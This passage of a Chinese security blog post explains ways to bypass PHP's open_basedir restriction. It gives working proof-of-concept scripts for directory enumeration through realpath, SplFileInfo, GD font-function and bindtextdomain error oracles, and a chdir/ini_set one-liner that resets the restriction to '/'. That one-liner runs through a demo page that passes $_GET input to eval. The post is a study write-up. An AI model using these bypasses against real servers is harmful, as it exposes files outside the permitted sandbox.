</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">((</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">'.'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">'..'</span><span class="p">)){</span><span class="nx">delfile</span><span class="p">(</span><span class="nv">$name</span><span class="p">);}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">closedir</span><span class="p">(</span><span class="nv">$mydir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)</span> <span class="o">?</span> <span class="k">true</span> <span class="o">:</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">File_Str</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">'//'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="nv">$string</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getRandStr</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$randStr</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$randStr</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$chars</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$randStr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>
<h1 class="relative group">realpath列举目录 
    <div class="anchor" id="realpath列举目录"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#realpath%e5%88%97%e4%b8%be%e7%9b%ae%e5%bd%95">#</a>
</span>
</h1>
<p><strong>Realpath</strong>函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。
but，在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。
所以就是利用这个特性进行猜解，考虑到效率问题，所以利用了Windows下的通配符</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span> <span class="c1">//打印了当前open限制的目录
</span></span></span><span class="line"><span class="cl"><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/File\((.*)\) is not within/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">printf</span><span class="p">(</span><span class="s2">"%s &lt;br/&gt;"</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>脚本可以列出D:/test/下的文件目录，当然这个只在Windows下适用在linux下面不适用
这里还有一个缺点就是不能列出来首字母相同的文件，所以我打算改进一下p神的脚本</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 设置 open_basedir 指令
</span></span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 打印 open_basedir 限制
</span></span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">"&lt;b&gt;open_basedir: "</span> <span class="o">.</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/b&gt;&lt;br /&gt;"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 定义自定义错误处理程序
</span></span></span><span class="line"><span class="cl"><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 目录和字符
</span></span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 迭代字符
</span></span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 尝试访问文件
</span></span></span><span class="line"><span class="cl">        <span class="nv">$realpath</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$realpath</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 文件无法访问
</span></span></span><span class="line"><span class="cl">            <span class="nx">trigger_error</span><span class="p">(</span><span class="s2">"File </span><span class="si">$file</span><span class="s2"> is not within allowed directories."</span><span class="p">,</span> <span class="nx">E_USER_WARNING</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 如果下一个字符的首字母与当前字符的首字母相同，则跳过
</span></span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 自定义错误处理程序函数
</span></span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/File\((.*)\) is not within/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;br /&gt;"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div>
<h1 class="relative group">利用SplFileInfo::getRealPath()列举目录 
    <div class="anchor" id="利用splfileinfogetrealpath列举目录"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%a9%e7%94%a8splfileinfogetrealpath%e5%88%97%e4%b8%be%e7%9b%ae%e5%bd%95">#</a>
</span>
</h1>
<p><strong>SplFileInfo</strong>类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath。</p>
<p>这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。</p>
<p>这个方法有个特点：<strong>完全没有考虑open_basedir</strong>。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。
所以不像realpath需要考虑是否在open_basedir下面的条件</p>
<p>P神POC</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$basedir</span> <span class="o">=</span> <span class="s1">'D:/test/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileInfo</span><span class="p">(</span><span class="nv">$basedir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="na">getRealPath</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">'&lt;br/&gt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ob_flush</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">flush</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div>
<h1 class="relative group">利用chdir与ini_set 
    <div class="anchor" id="利用chdir与ini_set"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%a9%e7%94%a8chdir%e4%b8%8eini_set">#</a>
</span>
</h1>
<p>首先解释一下<strong>ini_set</strong>
<a href="https://www.php.net/manual/zh/function.ini-set" target="_blank">https://www.php.net/manual/zh/function.ini-set</a>
这里先放一下demo network师傅的</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">'open_basedir: '</span><span class="o">.</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span><span class="o">.</span><span class="s1">'&lt;br&gt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">'GET: '</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;br&gt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">'open_basedir: '</span><span class="o">.</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>EXP:</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s1">'sub'</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">'sub'</span><span class="p">);</span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span><span class="s1">'..'</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">);</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">'/'</span><span class="p">));</span>
</span></span></code></pre></div><p>一些分析：
<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a>
好吧我实在是看不下去底层了…还是功底不够..还得练</p>
<h1 class="relative group">GD库imageftbbox/imagefttext 
    <div class="anchor" id="gd库imageftbboximagefttext"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#gd%e5%ba%93imageftbboximagefttext">#</a>
</span>
</h1>
<p>看了一下其实和前面的realpath一样都是通过一些报错来进行猜解
当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。</p>
<p>POC：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//$m = imagecreatefrompng("zip.png");
</span></span></span><span class="line"><span class="cl">    <span class="c1">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');
</span></span></span><span class="line"><span class="cl">    <span class="nx">imageftbbox</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="s1">'aaa'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$errstr</span><span class="p">,</span> <span class="s1">'Invalid font filename'</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">printf</span><span class="p">(</span><span class="s2">"%s&lt;br/&gt;"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div>
<h1 class="relative group">bindtextdomain暴力执法 
    <div class="anchor" id="bindtextdomain暴力执法"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#bindtextdomain%e6%9a%b4%e5%8a%9b%e6%89%a7%e6%b3%95">#</a>
</span>
</h1>
<p>emm原理还是一样但是鸡肋，因为Windows下面默认没有这个函数&amp;&amp;linux下面是不能使用通配符进行绕过所以如果上面的方法都没有用才会考虑这些猜解的问题</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s1">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$re</span> <span class="o">=</span> <span class="nx">bindtextdomain</span><span class="p">(</span><span class="s1">'xxx'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div>
<h1 class="relative group">reference 
    <div class="anchor" id="reference"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#reference">#</a>
</span>
</h1>
<p>1、 <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm" target="_blank">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm</a>
2、 <a href="https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkYL5AKeGIhxqGOjeD" target="_blank">https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkYL5AKeGIhxqGOjeD</a>
3、 <a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/" target="_blank">https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/</a>
4、 <a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
</div>
<div class="flex author">
<img alt="Delete's blog" class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" height="96" src="/1_hu_b7169b4e89707ead.jpg" width="96"/>
<div class="place-self-center">
<div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
<div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        Delete’s blog
      </div>
<div class="text-2xl sm:text-lg">
<div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
<a aria-label="Email" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="delete@student.gdufe.edu.cn" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z" fill="currentColor"></path></svg>
</span></span></a>
